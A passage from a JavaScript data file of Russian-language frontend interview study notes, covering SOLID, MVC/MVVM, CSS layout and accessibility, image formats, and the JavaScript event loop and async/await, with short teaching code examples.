    this.bindings.set(name, { factory, singleton });
  }

  make(name) {
    const { factory, singleton } = this.bindings.get(name);
    if (singleton) {
      if (!this.singletons.has(name)) this.singletons.set(name, factory(this));
      return this.singletons.get(name);
    }
    return factory(this);
  }
}

const c = new Container();
c.bind('db', () => new Database('localhost'), true); // singleton
c.bind('userService', (c) => new UserService(c.make('db')));

const userService = c.make('userService');
\`\`\`

**DI в React — через Context:**
\`\`\`js
const ServiceContext = createContext(null);

function App() {
  const services = { userService: new UserService(new Database()) };
  return (
    <ServiceContext.Provider value={services}>
      <Router />
    </ServiceContext.Provider>
  );
}

function UserProfile() {
  const { userService } = useContext(ServiceContext); // получает снаружи
}
\`\`\`

**DI в NestJS — через декораторы:**
\`\`\`ts
@Injectable()
class UserService {
  constructor(private db: Database, private logger: LoggerService) {}
}

@Module({ providers: [UserService, Database, LoggerService] })
class AppModule {}
\`\`\`

**Принцип D из SOLID (Dependency Inversion):**
\`\`\`ts
// Плохо — зависим от конкретного класса:
class UserService { constructor(private db: MySQLDatabase) {} }

// Хорошо — зависим от интерфейса:
interface Database { save(data: any): void; }
class UserService { constructor(private db: Database) {} }
// Теперь можно передать MySQL, PostgreSQL, MongoDB — любую реализацию
\`\`\`

**Преимущества:** тестируемость (моки), слабая связность, гибкость замены реализации.`}]},{id:"dev",title:"РАЗРАБОТКА ПО",icon:"⚙️",color:"#78909C",topics:[{name:"Функциональное программирование, его отличие от ООП",level:"2",content:`**ФП:**
• Данные неизменяемы (immutability)
• Чистые функции (нет побочных эффектов)
• Функции — first-class citizens
• Композиция функций
• Декларативный стиль

**ООП:**
• Данные + поведение в объектах
• Инкапсуляция, наследование, полиморфизм
• Изменяемое состояние
• Императивный стиль

**В JS используются оба:** React (ФП — компоненты как чистые функции, иммутабельный state) + классы, наследование.

**Currying** — преобразование функции с N аргументами в цепочку функций с одним:
\`\`\`js
const add = a => b => a + b;
const add5 = add(5);
add5(3); // 8 — частичное применение

// Практика: предконфигурация
const fetchWith = baseUrl => endpoint => fetch(baseUrl + endpoint);
const api = fetchWith('https://api.example.com');
api('/users'); // настроен один раз, переиспользуется
\`\`\`

**Pipe / Compose** — объединение функций в цепочку (data pipeline):
\`\`\`js
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);
const compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);

const transform = pipe(
  str => str.trim(),
  str => str.toLowerCase(),
  str => str.replace(/s+/g, '-')
);
transform('  Hello World '); // 'hello-world'
\`\`\`

**Иммутабельность:** никогда не мутируй — возвращай новый объект/массив:
\`\`\`js
// ❌ мутация
state.count++;
arr.push(item);
// ✅ иммутабельно
{ ...state, count: state.count + 1 }
[...arr, item]
\`\`\`
Именно поэтому React не видит изменения при мутации state — ссылка та же.`},{name:"SOLID, Cohesion и Coupling",level:"3",content:`**S — Single Responsibility:**
Класс/функция должна иметь одну причину для изменения — делать одно дело:
\`\`\`js
// Плохо — класс делает всё:
class User {
  constructor(name) { this.name = name; }
  save() { db.save(this); }         // работа с БД
  sendEmail() { email.send(this); } // отправка email
  render() { return \`<div>\${this.name}</div>\`; } // UI
}

// Хорошо — каждый класс своё дело:
class User { constructor(name) { this.name = name; } }
class UserRepository { save(user) { db.save(user); } }
class UserMailer { send(user) { email.send(user); } }
class UserComponent { render(user) { return \`<div>\${user.name}</div>\`; } }
\`\`\`

**O — Open/Closed:**
Открыт для расширения, закрыт для изменения:
\`\`\`js
// Плохо — каждый новый тип меняет функцию:
function getArea(shape) {
  if (shape.type === 'circle') return Math.PI * shape.radius ** 2;
  if (shape.type === 'square') return shape.side ** 2;
}

// Хорошо — расширяем без изменения:
class Circle { getArea() { return Math.PI * this.radius ** 2; } }
class Square { getArea() { return this.side ** 2; } }
class Triangle { getArea() { return 0.5 * this.base * this.height; } }
function getArea(shape) { return shape.getArea(); }
\`\`\`

**L — Liskov Substitution:**
Подкласс должен полностью заменять родителя без изменения поведения:
\`\`\`js
// Нарушение:
class Bird { fly() { return 'flying'; } }
class Penguin extends Bird {
  fly() { throw new Error('Пингвины не летают!'); } // ломает контракт!
}

// Правильно — разделить иерархию:
class Bird { }
class FlyingBird extends Bird { fly() { return 'flying'; } }
class Penguin extends Bird { swim() { return 'swimming'; } }
\`\`\`

**I — Interface Segregation:**
Не заставляй реализовывать методы которые не нужны:
\`\`\`ts
// Плохо — один большой интерфейс:
interface Worker { work(): void; eat(): void; sleep(): void; }
class Robot implements Worker {
  work() { }
  eat() { throw new Error('Роботы не едят!'); }
  sleep() { throw new Error('Роботы не спят!'); }
}

// Хорошо — маленькие интерфейсы:
interface Workable { work(): void; }
interface Eatable { eat(): void; }
class Robot implements Workable { work() { } }
class Human implements Workable, Eatable { work() { } eat() { } }
\`\`\`

**D — Dependency Inversion:**
Зависи от абстракций, не от конкретных реализаций:
\`\`\`ts
// Плохо — зависим от конкретного класса:
class UserService {
  private db = new MySQLDatabase(); // жёсткая зависимость!
}

// Хорошо — зависим от интерфейса:
interface Database { save(data: any): void; find(id: string): any; }
class UserService {
  constructor(private db: Database) {} // MySQL, PostgreSQL, MockDB — всё работает
}
\`\`\`

**Cohesion и Coupling:**
**Cohesion (связность)** — насколько элементы внутри модуля связаны по смыслу. Хочем высокую:
\`\`\`js
// Низкая — всё свалено в одном классе:
class Utils { formatDate() {} sendEmail() {} calculateTax() {} renderButton() {} }
// Высокая — каждый класс по теме:
class DateUtils { formatDate() {} parseDate() {} }
class EmailService { send() {} validate() {} }
\`\`\`

**Coupling (зацепление)** — насколько модули зависят друг от друга. Хочем низкое:
\`\`\`js
// Высокое — сам создаёт зависимости:
class OrderService {
  constructor() {
    this.userService = new UserService();
    this.db = new MySQL();
  }
}
// Низкое — получает снаружи (DI):
class OrderService {
  constructor(userService, emailService, db) {
    this.userService = userService;
    this.db = db;
  }
}
\`\`\`
Правило: **High Cohesion + Low Coupling** = хорошая архитектура.`},{name:"MVC, MVVM",level:"4",content:`Оба паттерна разделяют приложение на три роли: **Model** (данные и бизнес-логика, не знает про UI), **View** (отображение, максимально "тупое"), и посредник между ними — здесь они расходятся.

**MVC — Controller как посредник**

Поток данных:
\`\`\`
User → View → Controller → Model → (Observer) → View
\`\`\`
Простыми словами: пользователь нажал кнопку → View поймала событие и передала Controller → Controller вызвал метод на Model → Model сохранила данные и оповестила подписчиков → View сама перерисовалась. Controller в обратном потоке не участвует — он только принимает действия и меняет Model.

View подписана на Model через паттерн Observer. Model меняется → вызывает \`notify()\` → View сама перечитывает и обновляется. Controller в обратном потоке не участвует — он только принимает действия и меняет Model.
\`\`\`js
class UserModel {
  constructor() { this.users = []; this._subs = []; }
  subscribe(fn) { this._subs.push(fn); }
  addUser(user) { this.users.push(user); this._subs.forEach(fn => fn()); }
}

class UserView {
  constructor(model) {
    model.subscribe(() => this.render(model.users)); // подписка на Model
  }
  render(users) { document.body.innerHTML = users.map(u => u.name).join(', '); }
  onAddClick(cb) { document.getElementById('add').addEventListener('click', cb); }
}

class UserController {
  constructor(model, view) {
    view.onAddClick(() => model.addUser({ name: 'New' })); // только приём действий
  }
}
\`\`\`
Что даёт: Model не знает кто её слушает → одни данные можно показывать в нескольких View одновременно.

**MVVM — ViewModel как посредник**

Простыми словами: пользователь ввёл текст → binding автоматически записал значение в ViewModel → ViewModel пересчитала зависимые computed-свойства → binding автоматически обновил View. Программист не пишет "возьми из инпута и положи в переменную" — он декларирует связь, фреймворк синхронизирует сам в оба направления.

ViewModel не знает про конкретный UI — нет ссылок на DOM-элементы. Она просто хранит **состояние представления**: отформатированные данные, флаги загрузки, вычисленные значения. Связь View ↔ ViewModel — через **декларативный двусторонний binding**: программист описывает "это поле привязано к этому свойству", фреймворк делает синхронизацию сам.
\`\`\`js
// ViewModel (Vue 3 Composition API):
const useUsersVM = () => {
  const users = ref([]);
  const isLoading = ref(false);
  const searchQuery = ref('');
  const filtered = computed(() =>
    users.value.filter(u => u.name.includes(searchQuery.value))
  );
  async function load() {
    isLoading.value = true;
    users.value = await userService.fetchUsers(); // Model
    isLoading.value = false;
  }
  return { filtered, isLoading, searchQuery, load };
};
// View — только декларативные привязки, логики нет:
// <input v-model="searchQuery" />        ← two-way binding
// <div v-if="isLoading">Загрузка...</div>
// <li v-for="u in filtered">{{ u.name }}</li>
\`\`\`
\`v-model\` под капотом — два однонаправленных потока: \`:value="name"\` + \`@input="name = $event.target.value"\`.

**React — не MVC и не MVVM**

В React нет двустороннего binding. Это идеологическая позиция — **однонаправленный поток данных**. Когда пишешь:
\`\`\`jsx
<input value={name} onChange={e => setName(e.target.value)} />
\`\`\`
Это два явных однонаправленных потока которые ты сам связал. Убери \`onChange\` — инпут залочен. В Vue/Angular \`v-model\`/\`[(ngModel)]\` делают обе связки автоматически и декларативно. React ближе к архитектуре **Flux/Redux**: \`Action → Reducer → Store → View\`.

**Сравнение:**
\`\`\`
                MVC                     MVVM
Посредник       Controller              ViewModel
Знает про UI    часто да (ссылки)       нет, только состояние
View обновляется через Observer на Model через binding с ViewModel
Фишка           слабая связанность      декларативный two-way binding
\`\`\`

**Подводные камни:**
• В классическом MVC View — активный компонент, сам подписан на Model. Пассивная View (Controller обновляет её вручную) — это уже MVP.
• ViewModel ≠ Model: Model — бизнес-данные из БД, ViewModel — отформатированная дата, флаг раскрытия, вычисленный возраст.
• Two-way binding опасен в сложных приложениях: изменил A → обновил B через binding → B обновил A → цикл. Поэтому Angular рекомендует односторонний \`[ngModel]\` + явный \`(ngModelChange)\`.
• Redux/Flux — отдельная архитектура, появившаяся как реакция на сложности MVVM в больших SPA.`}]},{id:"css",title:"ВЁРСТКА",icon:"🎨",color:"#E44D26",topics:[{name:"Блочная модель",level:"1",content:`Content → Padding → Border → Margin

**content-box** (по умолчанию): width = только content. Padding + border добавляются сверху.
**border-box**: width = content + padding + border. Margin НЕ входит.

\`\`\`css
*, *::before, *::after { box-sizing: border-box; }
\`\`\`

**Margin collapsing:**
Вертикальные margins соседних блочных элементов схлопываются — берётся **больший**:
\`\`\`css
.a { margin-bottom: 20px; }
.b { margin-top: 30px; }
/* расстояние между ними = 30px, не 50px */
\`\`\`

**3 случая коллапса:**
1. Соседние siblings (братья)
2. Родитель и первый/последний ребёнок — если нет border/padding/overflow между ними
3. Пустой блок — его margin-top коллапсирует с margin-bottom

**Как предотвратить:** добавить padding/border на родителя, \`overflow: hidden\`, \`display: flex/grid\`.
Flexbox и Grid children **не коллапсируют** margins — одна из причин почему grid/flex так удобны.`,score:4},{name:"Семантичные теги, базовые теги",level:"1",content:`Семантические теги: header, main, footer, nav, section, article, aside, figure.

Семантика нужна для: доступности (скринридеры), SEO, читаемости кода.

**section** — блок с конкретной смысловой нагрузкой.
**article** — независимый контент (пост, комментарий).
**div** — нет семантики, для группировки/стилизации.`,score:4.5},{name:"Базовые CSS свойства",level:"1",content:`**display: none** — убирает из потока (нет размеров).
**visibility: hidden** — скрывает, но занимает место.
**opacity: 0** — скрывает, занимает место, реагирует на клики.

**position:** static (по умолчанию), relative (смещение от своего места), absolute (от ближайшего позиционированного предка), fixed (от viewport), sticky (гибрид relative + fixed).`,score:5},{name:"Специфичность селекторов",level:"2",content:`Формула **(a, b, c):**
• a = id
• b = классы, атрибуты, псевдоклассы
• c = теги, псевдоэлементы

\`!important > inline > #id > .class > tag\`

При равной специфичности → каскадность (позже = приоритетнее).`,score:4.5},{name:"Базовые псевдоклассы",level:"2",content:`**Псевдоклассы (:)** — состояние элемента: :hover, :active, :focus, :first-child, :nth-child(n), :not(), :checked, :disabled.

**Псевдоэлементы (::)** — виртуальный элемент: ::before, ::after, ::placeholder, ::selection.

**:nth-child(2)** — второй потомок вообще.
**:nth-of-type(2)** — второй элемент данного типа.

**:focus** — срабатывает при любом фокусе (мышь, клавиатура, программно).
**:focus-visible** — срабатывает только когда фокус виден пользователю — то есть при навигации с клавиатуры.

Зачем: кнопки при клике мышью получают :focus и показывают outline — это раздражает. С :focus-visible outline показывается только при навигации клавиатурой — удобно для accessibility.`,score:5},{name:"Типографика. Шрифты. Подключение шрифтов",level:"3",content:`**@font-face** — подключение локальных шрифтов:
\`\`\`css
@font-face {
  font-family: 'MyFont';
  src: url('./fonts/MyFont.woff2') format('woff2');
  font-display: swap;
}
\`\`\`

**Форматы:** woff2 (лучший, сжатие Brotli), woff (fallback), ttf/otf (старые).

**em vs rem:**
**em** — относительно размера шрифта родителя. Накапливается при вложенности:
\`\`\`css
/* Родитель 16px, дочерний 1.5em = 24px, внук 1.5em = 36px! */
\`\`\`
**rem** — относительно размера шрифта корневого элемента (html). Всегда предсказуемо:
\`\`\`css
html { font-size: 16px; }
.text { font-size: 1.5rem; } /* всегда 24px */
\`\`\`
Поэтому rem предпочтительнее для типографики.

**font-display:**
• **auto** — браузер решает сам
• **block** — текст невидим пока шрифт не загрузится (FOIT)
• **swap** — сразу показывает системный шрифт, потом меняет (FOUT) ✅ чаще всего используют
• **fallback** — короткий период невидимости (100ms), потом системный; если шрифт не успел — остаётся системный
• **optional** — браузер сам решает показывать кастомный шрифт или нет (зависит от скорости соединения)

swap — самый популярный выбор для производительности.`,score:3.5},{name:"PostCSS",level:"3",content:`**PostCSS** — инструмент для трансформации CSS через плагины.

Популярные плагины:
• **postcssPresetEnv** — современный CSS → полифилы (как Babel для CSS)
• **autoprefixer** — вендорные префиксы
• **postcssNested** — вложенность как в SASS
• **postcssMixins** — миксины
• **postcssImport** — @import`,score:4},{name:"Flexbox",level:"3",content:`Одномерная раскладка (строка ИЛИ колонка).

**Центрирование:** display: flex + justify-content: center + align-items: center.

**align-items** — внутри одной строки.
**align-content** — распределяет строки (только при flex-wrap: wrap).

**flex: 1** = flex-grow: 1, flex-shrink: 1, flex-basis: 0%.

**flex-grow** — как много элемент растёт относительно других.
**flex-shrink** — как много элемент сжимается.
**flex-basis** — начальный размер элемента.`,score:4},{name:"Базовое понимание контекста наложения",level:"3",content:`**z-index** работает с позиционированными элементами (relative, absolute, fixed, sticky). Может быть отрицательным.

**Stacking context** создаёт:
• position: absolute/relative/fixed/sticky + z-index не auto
• opacity < 1
• transform не none
• filter не none
• isolation: isolate
• will-change

Дочерний элемент соревнуется только внутри stacking context родителя.

**Главная ловушка** — z-index работает только внутри одного контекста наложения. Элемент с z-index: 9999 не перекроет элемент из другого контекста если его родитель имеет меньший z-index.`,score:3.5},{name:"Современные подходы к организации стилей",level:"3",content:`**CSS-Modules:** автоматические уникальные имена классов.
**CSS-in-JS (styled-components):** стили в JS, динамика через props. Минус: runtime-стоимость.
**Zero-runtime:** vanilla-extract, Linaria, Panda CSS — CSS-in-JS синтаксис, но компиляция в статичный CSS.`,score:3.5},{name:"Базовые свойства Grid",level:"3",content:`Двумерная раскладка (строки И колонки одновременно).

\`\`\`css
.grid {
  display: grid;
  grid-template-columns: 1fr 2fr 1fr;
  grid-template-rows: auto;
  gap: 16px;
}
\`\`\`

**fr** — доля свободного пространства: 1fr 2fr 1fr = 25% 50% 25%.

**grid-area** — размещение элемента по именованным областям.
**minmax(200px, 1fr)** — адаптивные колонки.

**auto-fill** — создаёт колонки даже если элементов нет, пустые колонки занимают место.
**auto-fit** — пустые колонки схлопываются до 0, существующие элементы растягиваются на всю ширину.`,score:4},{name:"Векторная и растровая графика",level:"4",content:'**Растровая графика** — двумерный массив пикселей фиксированного размера. Файл хранит цвет каждого пикселя (RGB/RGBA) плюс сжатие. При масштабировании браузер интерполирует — пикселизация.\n\n**Векторная графика** — инструкции для рисования: "нарисуй круг радиуса 50, залей синим". Браузер выполняет их на любом масштабе → бесконечное масштабирование без потерь.\n\n```\n                   Растр              Вектор\nМасштабирование    Пикселизуется      Без потерь\nРазмер зависит от  Разрешения         Сложности рисунка\nПодходит для       Фото, текстур      Иконок, логотипов\n```\n\n**Растровые форматы:**\n**JPEG** — lossy, для фото с большой палитрой. Нет прозрачности. Артефакты на резких границах (текст, иконки).\n**PNG** — lossless, с прозрачностью. Для скриншотов UI, диаграмм, резких границ.\n**WebP** — на 25-35% легче JPG/PNG при том же качестве. Lossy + lossless + прозрачность + анимация. Поддержка ~96%.\n**AVIF** — на ~50% агрессивнее JPG. Медленнее кодируется. Поддержка ~93%. Постепенно вытесняет WebP в проде.\n**GIF** — устаревший. 256 цветов, большой размер. Заменён WebP и `<video autoplay muted>`.\n\n**SVG** — единственный массовый векторный формат. Это XML-текст:\n• Inline в HTML → стилизация через CSS (`fill`, `stroke`, анимации), манипуляция через JS\n• Хорошо жмётся gzip\n• Для сложных иллюстраций (тысячи путей) становится тяжёлым — не для фото\n\n**Адаптивные изображения — проблема:**\nОдна `<img src="photo.jpg">` на мобилке занимает 300px, но качает 200 КБ под десктоп. На Retina (DPR=2) обычный JPG размытый.\n\n**Решение — `srcset` по ширине (`w`-дескриптор):**\n```html\n<img\n  src="photo-800.jpg"\n  srcset="photo-400.jpg 400w, photo-800.jpg 800w, photo-1600.jpg 1600w"\n  sizes="(max-width: 600px) 100vw, 50vw"\n  alt="...">\n```\n`srcset` — список файлов с реальной шириной. `sizes` — подсказка браузеру какой ширины будет картинка. Браузер сам выбирает оптимальный файл с учётом DPR.\n\n**По плотности (`x`-дескриптор)** — для фиксированных размеров (логотипы):\n```html\n<img src="logo.png" srcset="logo.png 1x, logo@2x.png 2x" alt="Logo">\n```\n\n**`<picture>`** — выбор формата под поддержку браузером:\n```html\n<picture>\n  <source srcset="photo.avif" type="image/avif">\n  <source srcset="photo.webp" type="image/webp">\n  <img src="photo.jpg" alt="...">\n</picture>\n```\nБраузер берёт первый поддерживаемый `<source>`. `<img>` — обязательный fallback и носитель `alt`.\n\n**Комбинация в проде** — `<picture>` за формат, `srcset` внутри за размер:\n```html\n<picture>\n  <source type="image/avif"\n    srcset="photo-400.avif 400w, photo-800.avif 800w"\n    sizes="(max-width: 600px) 100vw, 50vw">\n  <source type="image/webp"\n    srcset="photo-400.webp 400w, photo-800.webp 800w"\n    sizes="(max-width: 600px) 100vw, 50vw">\n  <img src="photo-800.jpg"\n    srcset="photo-400.jpg 400w, photo-800.jpg 800w"\n    sizes="(max-width: 600px) 100vw, 50vw"\n    alt="...">\n</picture>\n```\n\n**Подводные камни:**\n• CSS resize ≠ оптимизация. `<img style="width:50px">` на 200 КБ JPG всё равно качает 200 КБ\n• SVG в проде — почти всегда inline. `<img src="icon.svg">` загружает SVG как изолированный документ — внешние стили не действуют, `currentColor` не работает\n• PNG для скриншотов UI, не JPG — JPG размывает резкие границы и текст\n• `sizes` обязателен при `w`-дескрипторах — без него браузер выберет самый широкий файл\n• `loading="lazy"` не для LCP-элемента — для первого экрана используй `fetchpriority="high"`\n• `alt=""` — валидно для декоративных изображений, screen reader пропустит',score:2},{name:"browserslist",level:"4",content:`Конфиг, определяющий целевые браузеры. Читают: Autoprefixer, Babel, PostCSS Preset Env, ESLint.

\`\`\`json
"browserslist": ["> 1%", "last 2 versions", "not dead"]
\`\`\`

• **> 1%** — браузеры с долей использования больше 1% глобально
• **last 2 versions** — последние 2 версии каждого браузера
• **not dead** — исключает браузеры без официальной поддержки более 2 лет

Все инструменты работают согласованно по одному конфигу.

**Где хранить:**
• **.browserslistrc** — отдельный файл
• **package.json** — поле "browserslist"
• **в конфиге инструмента** — например в postcss.config.js`,score:2.5},{name:"Доступность (aria, tabindex & etc.)",level:"4",content:'Скринридер, голосовое управление и brl-дисплей работают через accessibility tree — структуру, которую браузер строит из семантики HTML. Нативные теги (`<button>`, `<nav>`, `<input>`) попадают туда автоматически с правильной ролью и поведением. Кастомный виджет на `<div>` — нет: AT видит просто безымянный блок и не может рассказать пользователю ни что это, ни в каком состоянии. ARIA-атрибуты — способ дописать эту информацию вручную: объявить роль, передать состояние, связать элементы между собой.\n\n**WAI-ARIA** — набор HTML-атрибутов, добавляющих семантику для assistive technologies (скринридеры, голосовое управление, brl-дисплеи).\n**tabindex** — атрибут, управляющий порядком и доступностью фокуса при клавиатурной навигации.\n\n**Правило №1 ARIA:** если есть нативный HTML-элемент — используй его, а не `role` поверх `<div>`. `<button>` всегда лучше чем `<div role="button" tabindex="0">` — нативный сам фокусируется, сам обрабатывает Enter/Space, сам имеет семантику.\n\n**Три группы ARIA-атрибутов:**\n\n**Roles — "что это за элемент"**\n```html\n<div role="button">Клик</div>\n<div role="dialog" aria-modal="true">...</div>\n<ul role="tablist"><li role="tab" aria-selected="true">Вкладка 1</li></ul>\n```\nЧастые: `button`, `dialog`, `alert`, `tablist`/`tab`/`tabpanel`, `combobox`, `listbox`/`option`, `tooltip`, `progressbar`.\n\n**States — "в каком состоянии элемент сейчас"** (меняются динамически, AT анонсирует изменения)\n```html\n<button aria-expanded="false" aria-controls="menu-1">Меню</button>\n<input aria-invalid="true" aria-describedby="error-msg">\n<div role="checkbox" aria-checked="false">Согласен</div>\n```\nЧастые: `aria-expanded`, `aria-checked`, `aria-selected`, `aria-pressed`, `aria-disabled`, `aria-hidden`, `aria-invalid`, `aria-busy`.\n\n**Properties — "как элемент описан и связан"** (обычно статичные)\n• `aria-label` — подпись когда нет видимого текста (иконка-кнопка)\n• `aria-labelledby` — id другого элемента, чей текст станет подписью\n• `aria-describedby` — id элемента с дополнительным описанием (ошибки, подсказки)\n• `aria-controls` — этот элемент управляет другим (по id)\n• `aria-live` — регион, изменения в котором AT анонсирует автоматически (тосты, уведомления)\n\n**Эвристика state vs property:** state меняется в ответ на действие (`aria-expanded` true/false при клике), property описывает элемент в принципе (`aria-labelledby` — связь с лейблом).\n\n**tabindex: три значения**\n\n`tabindex="-1"` — фокусируемый программно (`element.focus()`), Tab пропускает. Для: открытия модалки (ставим фокус на обёртку), skip-link цели (`<main tabindex="-1">`), блока ошибок после submit.\n\n`tabindex="0"` — в Tab-цепочке в DOM-порядке. Нужен для кастомных интерактивных элементов:\n```html\n<div role="button" tabindex="0" onclick="..." onkeydown="...">Кастомная кнопка</div>\n```\nДобавив `tabindex="0"`, обязан реализовать клавиатурное поведение — Enter/Space, стрелки, Escape.\n\n`tabindex >= 1` — антипаттерн. Переопределяет DOM-порядок, превращается в ад поддержки, ломается при композиции. Правильное решение: менять порядок в DOM, не в tabindex.\n\n**Focus management:**\n• **Focus trap** — Tab из последнего элемента модалки возвращает к первому, не уходит на страницу позади. Нативный `<dialog>` имеет встроенный focus trap.\n• **Focus restoration** — после закрытия модалки фокус возвращается на элемент который её открыл: `const saved = document.activeElement` → после закрытия `saved.focus()`.\n• **`:focus-visible`** — outline только при клавиатуре, не при клике мышью:\n```css\nbutton:focus { outline: none; }\nbutton:focus-visible { outline: 2px solid; }\n```\n\n**Skip-link — обязательная практика:**\n```html\n<a href="#main" class="skip-link">Перейти к контенту</a>\n<main id="main" tabindex="-1">...</main>\n```\n```css\n.skip-link { position: absolute; left: -9999px; }\n.skip-link:focus { left: 0; }\n```\n\n**aria-live для динамических уведомлений:**\n```html\n<div aria-live="polite">Загрузка завершена</div>     <!-- ждёт паузы -->\n<div aria-live="assertive">Критическая ошибка!</div>  <!-- прерывает сразу -->\n```\n\n**Подводные камни:**\n• ARIA не делает элемент функциональным — `role="button"` не добавляет обработку Enter. Только описывает для AT.\n• `aria-hidden="true"` не вешать на фокусируемые элементы — фокус прыгает на "невидимый" элемент, пользователь теряется.\n• `aria-label` перебивает текстовое содержимое — скринридер читает label, не текст кнопки. Только для иконок без текста.\n• Семантические заголовки не пропускать — AT строят оглавление по h1→h2→h3, пользователь навигирует по ним.\n• WCAG контраст: 4.5:1 для обычного текста, 3:1 для крупного (18px+) и UI элементов.\n• Тестировать с реальным скринридером: NVDA (Windows), VoiceOver (macOS/iOS), TalkBack (Android).',score:3}]},{id:"async",title:"АСИНХРОННОСТЬ",icon:"🔄",color:"#FF6B6B",topics:[{name:"XMLHttpRequest, fetch",level:"2",content:`**XMLHttpRequest** — колбэки. **fetch** — промисы.

**fetch при 404/500 — НЕ попадает в catch!** Только сетевые ошибки. Проверять response.ok.

\`\`\`js
fetch('/api').then(res => {
  if (!res.ok) throw new Error(res.status);
  return res.json();
}).catch(err => console.log(err));
\`\`\`

**Отмена запроса:**

 XHR — просто:
\`\`\`js
xhr.abort();
\`\`\`

fetch — через AbortController:
\`\`\`js
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal });

// Отменяем запрос
controller.abort();
\`\`\`
AbortController универсальнее — работает с любым Promise-based API.`,score:3.5},{name:"Механизм Event loop, тасоки и микротасоки",level:"3",content:`JavaScript — однопоточный язык. Он не может выполнять два куска кода одновременно. Event Loop — механизм, который решает, что выполнять следующим, и создаёт иллюзию параллельности.

**Call Stack**

Структура данных LIFO (Last In, First Out). Функция вызвана — добавляется на вершину. Завершилась — удаляется.
\`\`\`js
function a() { b(); }
function b() { c(); }
function c() { console.log('hello'); }
a();
// Call Stack в момент console.log:
// c   ← выполняется
// b   ← ждёт
// a   ← ждёт
// (global)
// Порядок завершения: c → b → a (LIFO)
\`\`\`
Пока call stack не пуст — Event Loop ничего не берёт из очередей.

**Microtask Queue — высокий приоритет**

Выполняется полностью после каждого синхронного блока, перед следующим макротаском.

Что попадает в микротаски:
• Promise.then / .catch / .finally
• queueMicrotask(callback)
• MutationObserver
• await (всё после await — микротаска)

Ключевое: если во время микротаски добавляется новая микротаска — она тоже выполнится до макротаска. Очередь опустошается полностью, даже если растёт в процессе.
\`\`\`js
Promise.resolve()
  .then(() => {
    console.log('microtask 1');
    Promise.resolve().then(() => console.log('microtask 2'));
  })
  .then(() => console.log('microtask 3'));
// Вывод: microtask 1 → microtask 2 → microtask 3
\`\`\`

**Task Queue — макротаски**

Event Loop берёт по одному макротаску за раз, после каждого — опустошает очередь микротасок.

Что попадает:
• setTimeout / setInterval
• DOM-события (click, input, keydown)
• I/O (ответ от сервера)
• MessageChannel

requestAnimationFrame — особый случай. Выполняется перед рендером браузера, после микротасок, но перед обычными setTimeout. Идеален для анимаций.

**Алгоритм одного тика:**
\`\`\`
1. Выполнить весь синхронный код до конца
2. Опустошить microtask queue полностью (включая новые)
3. Рендер браузера (rAF → Layout → Paint)
4. Взять ОДИН макротаск и выполнить
5. Перейти к шагу 2
\`\`\`

**Порядок:** Синхронный код → Микротаски → [Рендер] → Один макротаск → Микротаски → ...

**Примеры**

Пример 1 — базовый:
\`\`\`js
console.log('1');
setTimeout(() => console.log('2'), 0);
Promise.resolve().then(() => console.log('3'));
console.log('4');
// Вывод: 1 → 4 → 3 → 2
// 1, 4 — синхронно | 3 — микротаска | 2 — макротаска
\`\`\`

Пример 2 — вложенные микротаски:
\`\`\`js
Promise.resolve()
  .then(() => { console.log('A'); return Promise.resolve('B'); })
  .then(v => console.log(v));
Promise.resolve().then(() => console.log('C'));
// Вывод: A → C → B
// A и C — первый слой, B — второй (добавился после A)
\`\`\`

Пример 3 — async/await:
\`\`\`js
async function main() {
  console.log('A');        // синхронно
  await Promise.resolve();
  console.log('B');        // микротаска — после await
}
main();
console.log('C');
// Вывод: A → C → B
\`\`\`

**Нюансы и подводные камни**

**1. setTimeout(fn, 0) — не мгновенный.** Минимальный delay ~4ms для вложенных. Даже с 0 — всегда после микротасок.

**2. Бесконечная очередь микротасок блокирует рендер.** Если микротаски бесконечно добавляют новые — рендер никогда не случится, UI зависнет. Для тяжёлых задач используй setTimeout или rAF, чтобы дать браузеру вздохнуть.

**3. queueMicrotask vs Promise.resolve().then().** Оба добавляют микротаску, но queueMicrotask чище — не создаёт лишний Promise и не глотает ошибки.

**4. MutationObserver — микротаска.** Колбэки выполняются до рендера и до следующего макротаска.

**5. Node.js Event Loop отличается.** Есть дополнительные фазы: timers, pending callbacks, poll, check (setImmediate). process.nextTick() выполняется перед Promise-микротасками — особенность Node.js, в браузере её нет.`,score:4},{name:"async/await: Синтаксис, обработка ошибок",level:"3",content:`async-функция всегда возвращает Promise.

**await** разрезает функцию: до await — синхронно, после await — микротаска (.then()).

\`\`\`js
async function foo() { console.log(1); await x; console.log(2); }
console.log(3); foo(); console.log(4);
// 3, 1, 4, 2
\`\`\`

**Обработка ошибок:** try/catch или .catch() на промисе.

**return value vs return Promise.resolve(value):** второй на один микротик медленнее.

**Promise методы:**
• **Promise.all(promises)** — ждёт все, падает при первой ошибке. Результат: массив значений в том же порядке.
• **Promise.allSettled(promises)** — ждёт все, не падает. Результат: массив {status, value/reason}.
• **Promise.race(promises)** — возвращает первый завершившийся (fulfilled и rejected). Остальные игнорируются.
• **Promise.any(promises)** — возвращает первый успешный. Если все упали — AggregateError.
• **Promise.resolve(value)** — создаёт уже зарезолвленный Promise.
• **Promise.reject(reason)** — создаёт уже отклонённый Promise.

**Нюансы:**
\`\`\`js
Promise.race([rejected, resolved]) // вернёт rejected — первый завершился
Promise.any([rejected, resolved])  // вернёт resolved — первый успешный
\`\`\`
Promise.all — порядок результатов совпадает с порядком промисов, не с порядком завершения:
\`\`\`js
const [a, b] = await Promise.all([slowRequest, fastRequest]);
// a — результат slowRequest, b — fastRequest
\`\`\`
Promise.allSettled — никогда не попадёт в .catch().
Promise.any — единственный метод который бросает AggregateError (содержит массив всех ошибок).

**Цепочка .then().catch().finally():**
\`\`\`js
fetch('/api')
  .then(res => res.json())          // трансформация
  .catch(err => fallback)           // обработка ошибки, возвращает значение — цепочка продолжается!
  .finally(() => setLoading(false)) // выполняется всегда, не получает значение
\`\`\`

**После .catch() можно продолжить .then()** — если catch не бросает ошибку, цепочка восстанавливается:
\`\`\`js
fetch('/api')
  .then(res => res.json())
  .catch(err => ({ error: true }))  // вернули fallback-значение
  .then(data => render(data))       // выполнится с fallback-значением
\`\`\`
Если внутри .catch() сделать throw — следующие .then() будут пропущены до следующего .catch().`,score:4},{name:"Генераторы и итераторы",level:"4",content:`**Два протокола:**
• **Iterable** — объект с методом [Symbol.iterator]() возвращающим итератор
• **Iterator** — объект с методом next() возвращающим { value, done }

**Ручная реализация итератора:**
\`\`\`js
